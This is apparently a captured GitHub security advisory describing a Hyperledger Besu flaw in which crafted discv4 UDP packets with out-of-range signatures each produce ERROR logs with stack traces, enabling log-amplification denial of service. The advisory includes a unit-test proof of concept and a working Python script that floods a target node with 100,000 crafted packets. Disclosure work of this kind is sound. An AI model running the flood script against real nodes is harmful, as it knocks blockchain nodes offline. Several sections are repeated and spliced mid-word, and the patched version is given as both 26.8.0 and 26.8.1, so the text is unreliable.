# GHSA-h594-ww62-rcxv: Pre-authentication discovery-packet handling flaw allows remote unauthenticated log-amplification denial of service (discv4 UDP).

| Field | Value |
| --- | --- |
| Repo | hyperledger/besu |
| GHSA | GHSA-h594-ww62-rcxv |
| CVE | none assigned |
| Severity | medium (CVSS 5.3) |
| CWE | CWE-400, CWE-755, CWE-779 |
| Published | 2026-10-02T03:52:10Z |
| Updated | 2026-10-19T03:56:47Z |
| Affected | org.hyperledger.besu:besu <= 26.7.1 (patched: 26.8.0) |
| Credits | 0x1R15, macfarla, fab-10 |
| Advisory URL | https://github.com/besu-eth/besu/security/advisories/GHSA-h594-ww62-rcxv |
| Captured | 2026-11-12 (WAT), daily update |

## Description (verbatim)

## Summary

An unauthenticated, remote attacker can send small crafted **discv4 (peer discovery) UDP packets** to a Besu node that each cause an `ERROR`-level log line **with a full Java stack trace** to be emitted. Because discovery is enabled by default (UDP/30303) and requires no han## Summary

An unauthenticated, remote attacker can send small crafted **discv4 (peer discovery) UDP packets** to a Besu node that each cause an `ERROR`-level log line **with a full Java stack trace** to be emitted. Because discovery is enabled by default (UDP/30303) and requires no handshake, no session, and no valid signature, an attacker can flood these packets to drive **log/disk amplification, I/O saturation, and contention on the discovery decode/dispatch and logging threads** a remote unauthenticated availability impact.

The root cause is an exception-handling gap: `PacketDeserializer.decode()` only guarantees that malformed inbound packets surface as `PeerDiscoveryPacketDecodingException` (which the receive loop logs quietly at `TRACE`), but the signature-decoding step runs **outside** that guarantee and throws a raw `java.lang.IllegalArgumentException`, which the caller does not classify as a decode failure and therefore logs at `ERROR`.

## Affected component

`ethereum/p2p` discv4 discovery packet decoding:
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketDeserializer.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketFactory.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/PeerDiscoveryAgentV4.java`
- `crypto/algorithms/.../crypto/SECPSignature.java`

## Root cause

`PacketDeserializer.decode(...)` wraps only the RLP body decode in a try/catch that normalizes failures to `PeerDiscoveryPacketDecodingException`:

## Summary

An unauthenticated, remote attacker can send small crafted **discv4 (peer discovery) UDP packets** to a Besu node that each cause an `ERROR`-level log line **with a full Java stack trace** to be emitted. Because discovery is enabled by default (UDP/30303) and requires no han## Summary

An unauthenticated, remote attacker can send small crafted **discv4 (peer discovery) UDP packets** to a Besu node that each cause an `ERROR`-level log line **with a full Java stack trace** to be emitted. Because discovery is enabled by default (UDP/30303) and requires no handshake, no session, and no valid signature, an attacker can flood these packets to drive **log/disk amplification, I/O saturation, and contention on the discovery decode/dispatch and logging threads** a remote unauthenticated availability impact.

The root cause is an exception-handling gap: `PacketDeserializer.decode()` only guarantees that malformed inbound packets surface as `PeerDiscoveryPacketDecodingException` (which the receive loop logs quietly at `TRACE`), but the signature-decoding step runs **outside** that guarantee and throws a raw `java.lang.IllegalArgumentException`, which the caller does not classify as a decode failure and therefore logs at `ERROR`.

## Affected component

`ethereum/p2p` discv4 discovery packet decoding:
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketDeserializer.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketFactory.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/PeerDiscoveryAgentV4.java`
- `crypto/algorithms/.../crypto/SECPSignature.java`

## Root cause

`PacketDeserializer.decode(...)` wraps only the RLP body decode in a try/catch that normalizes failures to `PeerDiscoveryPacketDecodingException`:

dshake, no session, and no valid signature, an attacker can flood these packets to drive **log/disk amplification, I/O saturation, and contention on the discovery decode/dispatch and logging threads** a remote unauthenticated availability impact.

The root cause is an exception-handling gap: `PacketDeserializer.decode()` only guarantees that malformed inbound packets surface as `PeerDiscoveryPacketDecodingException` (which the receive loop logs quietly at `TRACE`), but the signature-decoding step runs **outside** that guarantee and throws a raw `java.lang.IllegalArgumentException`, which the caller does not classify as a decode failure and therefore logs at `ERROR`.

## Affected component

`ethereum/p2p` discv4 discovery packet decoding:
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketDeserializer.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketFactory.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/PeerDiscoveryAgentV4.java`
- `crypto/algorithms/.../crypto/SECPSignature.java`

## Root cause

`PacketDeserializer.decode(...)` wraps only the RLP body decode in a try/catch that normalizes failures to `PeerDiscoveryPacketDecodingException`:

dshake, no session, and no valid signature, an attacker can flood these packets to drive **log/disk amplification, I/O saturation, and contention on the discovery decode/dispatch and logging threads** a remote unauthenticated availability impact.

The root cause is an exception-handling gap: `PacketDeserializer.decode()` only guarantees that malformed inbound packets surface as `PeerDiscoveryPacketDecodingException` (which the receive loop logs quietly at `TRACE`), but the signature-decoding step runs **outside** that guarantee and throws a raw `java.lang.IllegalArgumentException`, which the caller does not classify as a decode failure and therefore logs at `ERROR`.

## Affected component

`ethereum/p2p` discv4 discovery packet decoding:
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketDeserializer.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/internal/packet/PacketFactory.java`
- `org/hyperledger/besu/ethereum/p2p/discovery/discv4/PeerDiscoveryAgentV4.java`
- `crypto/algorithms/.../crypto/SECPSignature.java`

## Root cause

`PacketDeserializer.decode(...)` wraps only the RLP body decode in a try/catch that normalizes failures to `PeerDiscoveryPacketDecodingException`: 
```java
final PacketData packetData;
try {
  packetData = deserializer.readFrom(RLP.input(message.slice(Packet.PACKET_DATA_INDEX)));
} catch (final RLPException e) {
  throw new PeerDiscoveryPacketDecodingException("Malformed packet of type: " + packetType, e);
} catch (final IllegalArgumentException e) {
  throw new PeerDiscoveryPacketDecodingException("Failed decoding packet of type: " + packetType, e);
}
return packetFactory.create(packetType, packetData, message);   // <-- OUTSIDE the try/catch
```
packetFactory.create(...) performs signature decoding on attacker-controlled bytes:
``` 
// PacketFactory.decodeSignature()
final BigInteger r = encodedSignature.slice(0, 32).toUnsignedBigInteger();
final BigInteger s = encodedSignature.slice(32, 32).toUnsignedBigInteger();
final int recId   = encodedSignature.get(64);
return signatureAlgorithm.createSignature(r, s, (byte) recId);   // -> SECPSignature.create(...)
```
SECPSignature.create(...) throws IllegalArgumentException when r/s are outside [1, n) or recId ∉ {0,1}:
```
checkInBounds("r", r, curveOrder);   // throws IllegalArgumentException if r < 1 or r >= n
checkInBounds("s", s, curveOrder);
if (recId != 0 && recId != 1) { throw new IllegalArgumentException(...); }
```
Because this call is outside decode()'s try/catch, the IllegalArgumentException propagates unclassified. In PeerDiscoveryAgentV4.handleRawIncoming(...), the completion handler only treats a fixed set of types as benign:
```if (err instanceof PeerDiscoveryPacketDecodingException
    || err instanceof DecodeException
    || err instanceof EndOfRLPException) {
  LOG.trace("Discarding invalid peer discovery packet: {}, {}", err.getMessage(), err);
} else {
  LOG.error("Encountered error while handling packet", err);   // <-- attacker-reachable ERROR + stack trace
}
```
IllegalArgumentException is none of the three, so every crafted packet produces an ERROR log with a stack trace.

Corroboration that this is an oversight: the RLPx (TCP) path deliberately treats exactly this exception as benign malformed-peer input DeFramer.exceptionCaught(...) catches FramingException | RLPException | IllegalArgumentException and logs at DEBUG. The discovery UDP path simply omits IllegalArgumentException from its equivalent classification.

Attack / reachability
Fully pre-authentication over UDP. To reach the vulnerable signature-decode step, the packet must (a) be ≥ PACKET_DATA_INDEX bytes, (b) carry a recognised packet type, (c) contain a body that decodes successfully (so the inner try/catch is not triggered), and (d) carry a valid integrity hash (keccak256(signature || type || body), which involves no secret). The signature itself does not need to be valid setting r = 0 trips checkInBounds and triggers the escaping exception.

A minimal 104-byte ENR_REQUEST packet meets all conditions. Note that the body must carry a future expiration timestamp, otherwise ExpiryValidator.validate() throws inside the inner try/catch (wrapped, logged at TRACE) and the signature step is never reached.
Proof of concept
(1) Confirmed with a compiled unit test against Besu's own code (passes):
```java
// ethereum/p2p/src/test/.../discv4/internal/packet/DiscoveryLogFloodPoCTest.java
final byte[] sig = new byte[65];
sig[63] = 0x01;                                   // s = 1 (in-bounds); r = 0 (out-of-bounds)
final Bytes signature = Bytes.wrap(sig);
final Bytes type = Bytes.of(0x05);                // ENR_REQUEST
final Bytes body = Bytes.of(0xc5,0x84,0xff,0xff,0xff,0xff);  // RLP [ 0xFFFFFFFF ] -> future expiration
final Bytes rest = Bytes.concatenate(signature, type, body);
final Bytes packet = Bytes.concatenate(Hash.keccak256(rest), rest);   // 104 bytes, no secret

assertThatThrownBy(() -> packetPackage.packetDeserializer().decode(packet))
    .isInstanceOf(IllegalArgumentException.class)                     // escapes the decode contract
    .isNotInstanceOf(PeerDiscoveryPacketDecodingException.class);     // => caller logs at ERROR
```
Result: PASS decode() throws java.lang.IllegalArgumentException, not PeerDiscoveryPacketDecodingException, confirming the escape that routes to LOG.error.
(2) Standalone sender for a live (authorized) node:
```python 
import socket, sys
from Crypto.Hash import keccak
def k(b):
    h = keccak.new(digest_bits=256); h.update(b); return h.digest()
sig  = (0).to_bytes(32,"big") + (1).to_bytes(32,"big") + b"\x00"   # r=0 -> IllegalArgumentException
body = bytes([0xc5,0x84,0xff,0xff,0xff,0xff])                      # ENR_REQUEST future expiration
rest = sig + b"\x05" + body
pkt  = k(rest) + rest                                              # 104 bytes
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for _ in range(int(sys.argv[3]) if len(sys.argv)>3 else 100000):
    s.sendto(pkt, (sys.argv[1], int(sys.argv[2])))                # target: authorized node only
```
Each packet produces one ERROR "Encountered error while handling packet" with an IllegalArgumentException stack trace on the target.

Impact
Remote, unauthenticated, low-complexity availability impact:

Unbounded ERROR logging with stack traces (no rate limiting before decode; only a packet-size check gates the path).
Disk exhaustion via the default file appender; I/O saturation.
CPU cost of stack-trace generation and synchronous log writes on the discovery decode/dispatch threads, degrading peer discovery.

## Patches and references

Fixed in Besu 26.8.1.

- Patch commit on `main`: https://github.com/besu-eth/besu/commit/de54bf9be0aa
- Pull request: https://github.com/besu-eth/besu/pull/11093
